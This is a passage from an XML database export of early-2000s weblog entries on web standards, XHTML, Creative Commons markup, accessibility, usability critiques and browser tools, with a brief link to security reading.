&lt;p&gt;That said, I have to admit I have a few reservations about the machine readable form of the &lt;acronym title=&quot;Creative Commons&quot;&gt;CC&lt;/acronym&gt; licenses. The recommended way of including them in a page is &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; embedded in a comment, similar to Moveable Type's &lt;a href=&quot;http://www.movabletype.org/trackback/&quot;&gt;Trackback&lt;/a&gt; system. This is fine for &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; documents (although it feels like a bit of a cludge) but is problematic when used with &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;. Why? Because &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; documents are &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; documents, and the &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; specification &lt;a href=&quot;http://www.w3.org/TR/REC-xml#sec-comments&quot; title=&quot;Extensible Markup Language (XML) 1.0 (Second Edition) - Section 2.5: Comments&quot;&gt;states&lt;/a&gt; that &lt;q cite=&quot;http://www.w3.org/TR/REC-xml#sec-comments&quot;&gt;an XML processor may, but need not, make it possible for an application to retrieve the text of comments&lt;/q&gt;. The logical way of extracting Creative Commons information from an &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; document would be to parse it with an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; processor, but it is likely that many processors will be unable to extract the comments (and even those with the ability to extract them will not treat them as &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;, requiring a second run of the &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parser to extract information from the &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt;). In practical terms this is unlikely to be a problem as regular expressions can be used instead, but from an idealogical point of view it leaves something of a bad taste in the mouth.&lt;/p&gt;

&lt;p&gt;If I'm going to criticise the embedded &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; approach I should probably suggest an alternative. The HTML 4 specification &lt;a href=&quot;http://www.w3.org/TR/REC-html40/types.html#h-6.12&quot; title=&quot;Basic HTML data types: 6.12 Link types&quot;&gt;describes&lt;/a&gt; a &quot;Copyright&quot; link type which is defined as follows:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.w3.org/TR/REC-html40/types.html#h-6.12&quot;&gt;
&lt;dl&gt;
&lt;dt&gt;Copyright&lt;/dt&gt;
&lt;dd&gt;Refers to a copyright statement for the current document.&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;

&lt;p&gt;I suggest using a &lt;code&gt;link&lt;/code&gt; element in the &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; section of a document which points to the Creative Commons license governing the page in question (or to an &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; document similar to that currently used by the embedded comments method). If you view source on your page you will see that I have done exactly that.&lt;/p&gt;</field>
		<field name="created">2002-12-19 00:41:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">667</field>
		<field name="title">Tantek's markup challenge</field>
		<field name="slug">tanteksMarkupChallenge</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://tantek.com/log/2002/12.html#L20021216t2238&quot;&gt;A Touch of Class&lt;/a&gt;, Tantek continues his series of tips on writing better semantic markup and then issues a challenge: find related improvements that can be made to his blog. I couldn't find anything in the overall structure, but I have a few (admittedly nit-picky) suggestions for his current entries. Firstly, the following line would, in my opinion, be better served with a titled &lt;code&gt;&amp;lt;dfn&amp;gt;&lt;/code&gt; element:&lt;/p&gt;

&lt;blockquote cite=&quot;http://tantek.com/log/2002/12.html#web20021217t1931&quot;&gt;&lt;pre&gt;&lt;code&gt;New &amp;lt;strong title=&quot;shopping by surfing&quot;&amp;gt;shurfing&amp;lt;/strong&amp;gt; tool.&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;p&gt;Secondly, Tantek frequently uses a combination of a &lt;code&gt;pre&lt;/code&gt; and a &lt;code&gt;code&lt;/code&gt; tag to mark up sections of example code. This works fine, but could potentially be improved by adding a class element hinting at the type of code being displayed, for example:&lt;/p&gt;

&lt;pre&gt;
&amp;lt;pre&amp;gt;&amp;lt;code class=&quot;css&quot;&amp;gt;
p.sidebartext { 
  padding:0 5px 2px;
  font-size:11px; 
  margin-top:2px
}
&amp;lt;/code&amp;gt;&amp;lt;/pre&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Finally, Tantek's use of &lt;code&gt;&amp;lt;a class=&quot;local&quot;&amp;gt;&lt;/code&gt; to differentiate local and external links introduces (technically) redundant data - the fact that the link is to a local resource is implicit in its &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;. This information can even be extracted using &lt;acronym title=&quot;Cascading Style Sheets 3&quot;&gt;CSS3&lt;/acronym&gt; selectors, as is demonstrated by Stuart's ingenous article &lt;a href=&quot;http://www.kryogenix.org/days/000233.cas#000233&quot;&gt;External link icons the CSS way&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-19 00:55:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">668</field>
		<field name="title">Hotbot redesign</field>
		<field name="slug">hotbotRedesign</field>
		<field name="body">&lt;p&gt;Douglas Bowman &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20021216&quot; title=&quot;HotBot Redesign Launched&quot;&gt;provides&lt;/a&gt; some background to the new &lt;a href=&quot;http://validator.w3.org/check?uri=http://www.hotbot.com/&quot;&gt;HotBot&lt;/a&gt; redesign, which uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for layout and &lt;a href=&quot;http://validator.w3.org/check?uri=http://www.hotbot.com/&quot;&gt;almost but doesn't quite&lt;/a&gt; validate. It was all looking great until the &lt;a href=&quot;http://www.hotbot.com/prefs_skins.asp&quot;&gt;HotBot Skins&lt;/a&gt; page told me I should upgrade to a browser that supports web standards (I was using &lt;a href=&quot;http://www.mozilla.org/projects/phoenix/&quot;&gt;Phoenix&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-12-19 01:06:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">669</field>
		<field name="title">Conversations with Joe Clark</field>
		<field name="slug">conversationsWithJoeClark</field>
		<field name="body">&lt;p&gt;Jonathan Delacour is &lt;a href=&quot;http://weblog.delacour.net/archives/000792.html&quot; title=&quot;Conversation with Joe Clark: 03&quot;&gt;three days in&lt;/a&gt; to his Conversation with Joe Clark series (see also parts &lt;a href=&quot;http://weblog.delacour.net/archives/000790.html&quot; title=&quot;Conversation with Joe Clark: 01&quot;&gt;one&lt;/a&gt; and &lt;a href=&quot;http://weblog.delacour.net/archives/000791.html&quot; title=&quot;Conversation with Joe Clark: 02&quot;&gt;two&lt;/a&gt; and the &lt;a href=&quot;http://weblog.delacour.net/archives/000789.html&quot; title=&quot;Building Accessible Websites, by Joe Clark&quot;&gt;introductory book review&lt;/a&gt;). I thoroughly recommend reading the whole series, but here are a few points that stood out for me:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblog.delacour.net/archives/000790.html&quot;&gt;
&lt;p&gt;In the meantime, firing all the boy-racer HTML programmers who think they're tough shit would be a good place to start. They're jumped-up script kiddies; it was quite telling that my submission of well-written, copy-edited text in a valid HTML document was an absolute first for Slashdot. This is a clientele that does not know what the Shift key does or how to debug two nested ordered lists. (The latter is an actual example from a site I worked on. The concept of closing a paired tag had never occurred to them, so they could not find the error in the sequence &lt;code&gt;&amp;lt;ol&amp;gt;&amp;lt;li&amp;gt;&amp;lt;ol&amp;gt;&amp;lt;li&amp;gt;&amp;lt;/ol&amp;gt;&lt;/code&gt;.)&lt;/p&gt;

&lt;p&gt;And of course we'll also have to fire the boy racers' clueless Dockers-wearing manager dweebs, who consider themselves old-timers because they got online in 1998 (!) and whose entire experience of the Internet is the commercial Web as rendered through Internet Explorer for Windows. These people cannot even *spell* &quot;W3C&quot; and still think banner ads have not been given a fair shake.&lt;/p&gt;

&lt;p&gt;If we could rid the Web-development ecosystem of life-sapping parasites like these - essentially, everyone who is immature and/or has *bad taste* - then we stand a good chance of making valid, standards-compliant Web development the norm rather than the exception&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To avoid the risk of misrepresenting Joe's responses by quoting the above, I should mention that the rest of the series is far less inflammatory.&lt;/p&gt;

&lt;p&gt;This note about accessible forms also caught my eye:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblog.delacour.net/archives/000791.html&quot;&gt;&lt;p&gt;
People use tables for forms so that online forms look like printed forms - that is, they use as much of the &quot;paper&quot; as possible, because &quot;paper&quot; is expensive. But online we have unlimited screen real estate, at least in the vertical dimension. HTML forms, at root, yearn to be vertical, not horizontal. Do not flout their natural desires. Do not attempt to overlay the design of printed forms onto online forms.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Finally, yet another reason not to spend hundreds of thousands of pounds on an &quot;enterprise&quot; CMS:&lt;/p&gt;

&lt;blockquote cite=&quot;http://weblog.delacour.net/archives/000792.html&quot;&gt;&lt;p&gt;
The larger CMSs are a kind of protection racket: You buy our system for six figures, and then you keep paying us every year to maintain your license, and also you'll have to hire a person trained in our ways to keep your system up and running. Fail to do any of that and your entire site crashes. It's extortion, really, and high-end CMSs are dogs in so many ways - they can't produce valid code, their URLs are appalling, and they are difficult to use. In essence, big CMSs are mainframe systems, with the same need for constant nursing and non-stop tending by codependent system administrators as those old mainframes.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The comments attached to the various stories are also well worth reading. I particularly liked &lt;a href=&quot;http://www.delacour.net/mt/mt-comments.pl?entry_id=789&quot;&gt;Mark Pilgrim's argument&lt;/a&gt; as to why Joe's controversial views on fixed font sizes should be taken with a healthy pinch of salt:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.delacour.net/mt/mt-comments.pl?entry_id=789&quot;&gt;&lt;p&gt;
Simply put, I believe that there is a large class of people who would not in any way refer to themselves as &quot;visually impaired&quot; or &quot;disabled&quot; in any way, who nonetheless can not read 9px type on their computer monitor. Reading on-screen is hard enough as it is, and tiny type in stupid fonts only makes a bad situation worse. These affected people are not running screen magnification software as Joe suggests; they are not running any accessibility-related software at all, because they do not view themselves as disabled. At most, they may be running in a display theme with slightly larger fonts, which means that everything on their computer that they read on a regular basis (menus, buttons, toolbars) is readable -- everything except web pages that use absolute font sizes.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;My Father certainly falls in to this category of users, and was very impressed when I showed him Mozilla's text resizing ability (he had not realised text resizing was possible in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; either). I find it extremely annoying that modern browsers consistently hide their basic text resizing options - &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 3 got it right by including an increase/decrease text size button in the main toolbar by default but browsers since then have all conspired to hide the option in a menu where it is far less likely to be found by casual browser users.&lt;/p&gt;</field>
		<field name="created">2002-12-19 15:29:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">670</field>
		<field name="title">Gracefully degrading</field>
		<field name="slug">gracefullyDegrading</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.stopdesign.com/&quot;&gt;StopDesign&lt;/a&gt; is a superb example of a site that degrades gracefully for Netscape 4, thanks to a carefully crafted &lt;a href=&quot;http://www.stopdesign.com/css/low.css&quot;&gt;basic stylesheet&lt;/a&gt;. Doug &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20021218&quot; title=&quot;Wed | 18 Dec 2002 : Upgrade Messages&quot;&gt;discusses&lt;/a&gt; the necessity of including a browser upgrade message and some of the different approaches used around the 'net.&lt;/p&gt;</field>
		<field name="created">2002-12-19 16:23:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">671</field>
		<field name="title">Usability.net rant</field>
		<field name="slug">usabilityNetRant</field>
		<field name="body">&lt;p&gt;Someone, please, tell me &lt;a href=&quot;http://www.usabilitynet.org/&quot;&gt;UsabilityNet&lt;/a&gt; is a joke. Spotted via an &lt;a href=&quot;http://www.hebig.org/blogs/archives/main/000699.php&quot; title=&quot;Releases and Relaunches&quot;&gt;article on hebig.org&lt;/a&gt;, UsabilityNet (apparently recently redesigned) claims to be &quot;a project funded by the European Union to provide resources and networking for usability practitioners, managers and EU projects&quot;. Again, &lt;acronym title=&quot;I Am Not A Usability Expert&quot;&gt;IANAUE&lt;/acronym&gt; but here are some things wrong with it just off the top of my head:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The site uses Flash for all of the navigation (including the stuff on the front page), apparently for the sole reason of providing a rollover effect for links. This comes at the cost of requiring a plugin (sure Flash has something like a 95% market share, but try telling that to someone who browses with Lynx), making the site far less attractive to search engines and, most importantly of all, &lt;strong&gt;disabling my right mouse button&lt;/strong&gt;. I can't open links in new windows, I can't open links in new tabs and I can't copy the URL of a link to the clipboard without following the link first.&lt;/li&gt;
&lt;li&gt;&quot;Help us improve our site: click the WAMMI button&quot;. The WAMMI button is a big grey square with &quot;WAMMI&quot; written on it. It links to a questionaire about the site, but the actual text of the button (an acronym which is not explained anywhere) fails to indicate what it does completely.&lt;/li&gt;
&lt;li&gt;The site replicates Jakob Nielsen's &lt;a href=&quot;http://www.usabilitynet.org/management/b_mistakes.htm&quot;&gt;Top Ten Mistakes in Web Design&lt;/a&gt; and then blatantly ignores mistake 8, which warns against breaking the browser's ability to distinguish between visited and non visited links (the site uses the same colour for both in the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, and Flash does not have the capability to distinguish between them in the first place).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;It's not all bad - once you get over the utterly bizzare decision to use Flash for the primary navigation it is relatively easy to navigate the site, understand what it has to offer and find the information you are looking for. The site claims to have been designed with accessibility in mind so it is likely that they have implemented Flash MX's accessibility features (I have no way of testing this) but Flash is still inherently less accessible than plain &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; thanks to its graphical nature and reliance on a plugin. The thing that baffles me most is that the Flash used on the site is completely reproducable in standard &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-20 17:57:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">672</field>
		<field name="title">Blockquote citations</field>
		<field name="slug">blockquoteCitations</field>
		<field name="body">&lt;p&gt;Inspired by Adrian Holovaty, I spent an hour this morning getting dirty with the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; in an effort to replicate his funky &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/12/20/0454&quot; title=&quot;Dynamically labeling blockquotes with CSS&quot;&gt;blockquote citations effect&lt;/a&gt; but with links that you can actually click on. The resulting code is now active on this weblog - check the javascript out &lt;a href=&quot;http://simon.incutio.com/blockquotes.js&quot; title=&quot;blockquotes.js&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It turns out Paul Hammond had exactly the same idea - his implementation can be found &lt;a href=&quot;http://www.paranoidfish.org/boxes/2002/12/20/&quot; title=&quot;2002/12/20 - Blockquote Citations&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-12-20 18:43:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">673</field>
		<field name="title">Security and coding style</field>
		<field name="slug">securityAndCodingStyle</field>
		<field name="body">&lt;p&gt;A couple of good web development security resources:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://m.bacarella.com/papers/secsoft/html/&quot;&gt;The Peon's Guide To Secure System Development&lt;/a&gt; - why most software is insecure, why this is a bad thing and some sugestions for strategies to improve the situation.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cgisecurity.com/articles/xss-faq.shtml&quot;&gt;The Cross Site Scripting FAQ&lt;/a&gt; - Cross site scripting (where malicious users insert HTML / javascript in to your site in some way that allows them to steal cookies or cause other problems) is an issue that all web developers should understand. It is easy to defend against once you understand the problem.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I also found myself reading the &lt;a href=&quot;http://www.purists.org/linux/&quot;&gt;Linux Kernel Coding Style&lt;/a&gt; document for some reason, and learnt some useful lessons about writing effective C (should I ever need to delve in to that language).&lt;/p&gt;</field>
		<field name="created">2002-12-20 20:27:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">674</field>
		<field name="title">Debugging HTTP headers</field>
		<field name="slug">debuggingHttpHeaders</field>
		<field name="body">&lt;p&gt;Tantek has &lt;a href=&quot;http://tantek.com/log/2002/12.html#web20021218t0548&quot; title=&quot;New HTTP favelets&quot;&gt;released&lt;/a&gt; two new favelets for &lt;a href=&quot;http://tantek.com/favelets/#http&quot;&gt;revealing HTTP information&lt;/a&gt;, using Mozilla's ever useful &lt;a href=&quot;http://webtools.mozilla.org/web-sniffer/&quot;&gt;Web Sniffer&lt;/a&gt; and Delorie's &lt;a href=&quot;http://www.delorie.com/web/headers.html&quot;&gt;HTTP Header Viewer&lt;/a&gt;. I spotted a similar tool on a recent trip to &lt;a href=&quot;http://mozdev.org/&quot;&gt;MozDev&lt;/a&gt;: &lt;a href=&quot;http://livehttpheaders.mozdev.org/&quot;&gt;LiveHTTPHeaders&lt;/a&gt; adds a &quot;Headers&quot; tab to the page information box in Mozilla 1.2, showing the full request and response headers used for the current page. It's a very nice tool, but unfortunately does not yet work with Phoenix (the headers tab is added to the info box but the header information does not appear).&lt;/p&gt;</field>
		<field name="created">2002-12-20 20:37:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">675</field>
		<field name="title">Smarter exceptions</field>
		<field name="slug">smarterExceptions</field>
		<field name="body">&lt;p&gt;Useful Java article: &lt;a href=&quot;http://www.fawcette.com/javapro/2002_12/online/exception_vroubtsov_12_16_02/&quot;&gt;Make Exceptions Smarter&lt;/a&gt; (&lt;a href=&quot;http://www.keithdevens.com/weblog/?id3209&quot; title=&quot;Links of the day&quot;&gt;via Keith&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-12-20 21:00:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">676</field>
		<field name="title">Christmas illness</field>
		<field name="slug">christmasIllness</field>
		<field name="body">&lt;p&gt;I've had an off-line Christmas, during which I've been struck down with a particularly nasty combination of 'flu and a chest infection. After sweating it out for a week I finally decided it wasn't improving and went to see a doctor. Verdict: &lt;q&gt;I think you're very ill&lt;/q&gt;. Exams are looming (they start on the 14th) and I haven't started revising yet. Ho hum.&lt;/p&gt;
</field>
		<field name="created">2003-01-04 20:10:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">677</field>
		<field name="title">Crufty</field>
		<field name="slug">crufty</field>
		<field name="body">&lt;p&gt;I have no intention of starting a language war, but my God &lt;a href=&quot;http://www.evolt.org/article/Camel_POOP_Object_Oriented_Programming_in_Perl/17/50922/index.html&quot; title=&quot;Camel POOP: Object Oriented Programming in Perl&quot;&gt;this is &lt;em&gt;ugly&lt;/em&gt;&lt;/a&gt;. Still, I guess it must work for some people.&lt;/p&gt;</field>
		<field name="created">2003-01-04 20:10:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">678</field>
		<field name="title">Write like a wanker</field>
		<field name="slug">writeLikeAWanker</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.infernus.net/rants/write_like_a_wanker.html&quot;&gt;How to write like a wanker&lt;/a&gt; is so true it almost hurts.&lt;/p&gt;</field>
		<field name="created">2003-01-04 20:38:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">679</field>
		<field name="title">The anatomy of Google</field>
		<field name="slug">theAnatomyOfGoogle</field>
		<field name="body">&lt;p&gt;Every now and then I stumble across this and then lose it again, so I'm blogging it for safe keeping. &lt;a href=&quot;http://www7.scu.edu.au/programme/fullpapers/1921/com1921.htm&quot;&gt;The Anatomy of a Large-Scale Hypertextual Web Search Engine&lt;/a&gt; is the research paper that kicked off the Google phenomenon, and despite its age still provides a great insight in to how the world's favourite search engine works (or used to work).&lt;/p&gt;</field>
		<field name="created">2003-01-04 20:39:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">680</field>
		<field name="title">Information Architecture testimonials</field>
		<field name="slug">informationArchitectureTestimo</field>
		<field name="body">&lt;p&gt;Poor old &lt;acronym title=&quot;The Asilomar Institute for Information Architecture&quot;&gt;AIFIA&lt;/acronym&gt; are still trying to explain what Information Architecture is in easily understood terms. Their latest effort should be pretty much garaunteed to succeed - &lt;a href=&quot;http://www.aifia.org/pg/testimonials.php&quot;&gt;14 testimonials&lt;/a&gt; from web experts explaining why it is important in pleasant little sound bites.&lt;/p&gt;</field>
		<field name="created">2003-01-04 20:54:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">681</field>
		<field name="title">Considered harmful considered harmful</field>
		<field name="slug">consideredHarmfulConsideredHar</field>
		<field name="body">&lt;p&gt;&lt;cite&gt;Eric Meyer&lt;/cite&gt;: &lt;a href=&quot;http://www.meyerweb.com/eric/comment/chech.html&quot;&gt;&quot;Considered Harmful&quot; Essays Considered Harmful&lt;/a&gt;. That's a shame, because I was planning on writing one for target=&quot;_blank&quot;. I guess I'll have to find another way of expressing my forthcoming rant.&lt;/p&gt;</field>
		<field name="created">2003-01-04 20:57:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">682</field>
		<field name="title">Top web design mistakes</field>
		<field name="slug">topWebDesignMistakes</field>
		<field name="body">&lt;p&gt;Jakob Nielsen: &lt;a href=&quot;http://www.useit.com/alertbox/20021223.html&quot;&gt;Top Ten Web-Design Mistakes of 2002&lt;/a&gt;. This is an astutely observed list, although I would add &quot;relying on Flash for navigation&quot; as one of the biggest modern mistakes (for some reason Jakob fails to mention Flash at all...). I particularly liked the following point about lengthy URLs, especially the (as far as I know) newly coined term &lt;dfn&gt;social navigation&lt;/dfn&gt;.&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.useit.com/alertbox/20021223.html&quot;&gt;
&lt;h3&gt;9. URL &amp;gt; 75 Characters&lt;/h3&gt;
&lt;p&gt;Long URLs break the Web's &lt;strong&gt;social navigation&lt;/strong&gt; because they make it virtually impossible to email a friend a recommendation to visit a Web page. If the URL is too long to show in the browser's address field, many users won't know how to select it. If the URL breaks across multiple lines in the email, most recipients won't know how to glue the pieces back together.&lt;/p&gt;

&lt;p&gt;The result? No viral marketing, just because your URLs are too long. Bad way to lose business.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Jakob also mentions, among other things, javascript in links (and links that open in new windows) and fixed font sizes. As previously hinted, I have a mega-rant about the former lined up for some time in the next few days.&lt;/p&gt;</field>
		<field name="created">2003-01-04 21:01:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">683</field>
		<field name="title">Internet Explorer cheats!</field>
		<field name="slug">internetExplorerCheats</field>
		<field name="body">&lt;p&gt;I had alway wondered why &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; appears to work so fast sometimes (not that I am at all unhappy with the speed displayed by Phoenix). Now I know - unsurprisingly, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; and &lt;acronym title=&quot;Internet Information Server&quot;&gt;IIS&lt;/acronym&gt; are cheating. Read the explanation &lt;a href=&quot;http://grotto11.com/blog/?+1039831658&quot; title=&quot;What makes IE so fast?&quot;&gt;here&lt;/a&gt; (&lt;a href=&quot;http://mpt.phrasewise.com/2003/01/05#a432&quot; title=&quot;I&amp;apos;m stuck in a heat wave&quot;&gt;via mpt&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2003-01-05 10:59:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">684</field>
		<field name="title">Merging comments and pingbacks</field>
		<field name="slug">mergingCommentsAndPingbacks</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://tantek.com/log/2003/01.html#L20030104t1249&quot; title=&quot;Comment markup, presentation and plumbing&quot;&gt;Tantek&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://tantek.com/log/2003/01.html#L20030104t1249&quot;&gt;
&lt;p&gt;[...] we now have Trackback and Pingback to help automate generating comment hyperlinks to blog-on-blog commentary. While I certainly applaud these efforts at automating the plumbing, I must ask - why is there any distinction in the presentation? I ask because many blogs present separate and different interfaces for their comments, trackbacks, and/or pingbacks.&lt;/p&gt;

&lt;p&gt;A comment is a comment is a comment. Why should it matter whether it was posted using a web form, sent via email, entered into a blog, or posted to Netnews? From a blog reader's perspective, I'd just like to see a list of the comments, and not care (nor know) about how the comment got there. Presentation/interface should be designed to present the data (information), not the underlying plumbing.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Good point (besides, I'm kind of fed up of having a seperate counter for comments and pingbacks under every post). I'm sure I've seen a blog that combines comments, pingbacks and trackbacks in to the same interface - I think it was &lt;a href=&quot;http://www.intertwingly.net/blog/&quot;&gt;Sam Ruby's&lt;/a&gt; and I'm sure I've seen it elsewhere as well. Something else to add to the list for the forever forthcoming redesign.&lt;/p&gt;</field>
		<field name="created">2003-01-05 11:17:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">685</field>
		<field name="title">Browser upgrade messages enter history</field>
		<field name="slug">browserUpgradeMessagesEnterHis</field>
		<field name="body">&lt;p&gt;There's been something of a backlash against &quot;browser upgrade&quot; messages recently, for a variety of reasons. Now Jeffrey Zeldman, the man who brought upgrade messages widespread attention in the first place, has admitted that he too is moving away from them. With 4.0 browsers almost a thing of the past and awareness of web standards much greater than it was a year ago it looks like they may have hit their retirement date. Incidentally, Jeffrey's &lt;a href=&quot;http://www.zeldman.com/daily/0103a.shtml#upgrade&quot; title=&quot;Upgrade notices, pro and con&quot;&gt;post&lt;/a&gt; includes the following piece of standards compliance propoganda which, while old hat to most people, I feel is still worth a quote:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.zeldman.com/daily/0103a.shtml#upgrade&quot;&gt;&lt;p&gt;
The cost of bandwidth-intensive, invalid markup, and of detection scripts that continually run afoul of their target, is too high. Such methods waste site owners’ money in a futile effort to keep up with ever-changing browser versions. More importantly, they hurt web users, forcing everyone to download bandwidth-busting heaps of inaccessible junk markup and proprietary code forks so that an ever-shrinking minority of old browser users can have the exact same experience as the majority. (Meanwhile, this same junk code locks out screen reader and wireless users, and often denies access to the physically impaired as well.)
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-01-05 23:41:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">686</field>
		<field name="title">XHTML is just fine</field>
		<field name="slug">xhtmlIsJustFine</field>
		<field name="body">&lt;p&gt;In &lt;a href=&quot;http://www.monokromatik.com/veethree/?viewNewsItem=1&amp;amp;newsitemid=623&quot;&gt;Who dropped the deat cat into the well?&lt;/a&gt; (via &lt;a href=&quot;http://diveintomark.org/archives/2003/01/05.html#poisoning_the_envelope&quot; title=&quot;Poisoning the envelope&quot;&gt;Mark Pilgrim&lt;/a&gt;), &lt;cite&gt;Brian Donovan&lt;/cite&gt; argues that keeping web site content in (X)HTML is a fundamentally bad idea. I thoroughly disagree. When I started this weblog, I realised I needed a format for storing my entries that would keep my content &quot;free&quot; to be reused in multiple different ways. I thought about a simple &lt;acronym title=&quot;Ultimate Bulletin Board&quot;&gt;UBB&lt;/acronym&gt; style markup language, with &lt;code&gt;[url=&quot;http://www.example.com/&quot;]links like this[/url]&lt;/code&gt;, automatic line breaks and a few other simple structures such as lists and headings. I also considered Wiki markup of some sort, again looking for a reasonable expressive but controlled markup vocabulary for storing my blog entries in a reusable way.&lt;/p&gt;

&lt;p&gt;Both &lt;acronym title=&quot;Ultimate Bulletin Board&quot;&gt;UBB&lt;/acronym&gt; code and WikiText have the disadvantage that they require extensive work with regular expressions to extract meaning from them. Regular expression support is excellent in the languages I normally work with (Python and &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;) but is not garaunteed across other technoogies, especially when differences in regular expression syntax start to become a problem.&lt;/p&gt;

&lt;p&gt;Since regular expressions were a bit risky, I decided to look at &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; - after all, it boasts excellent support across multiple languages and platforms and is designed for storing content in the neutral manner I desired. I quickly realised I needed an XML tag set with support for the various content that I would be including in my blog - paragraphs, links, quotations, the occasional list and maybe a few other simple document components. Then I realised that &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; offered exactly that, provided I stuck to the strict version and forgot about the presentation elements.&lt;/p&gt;

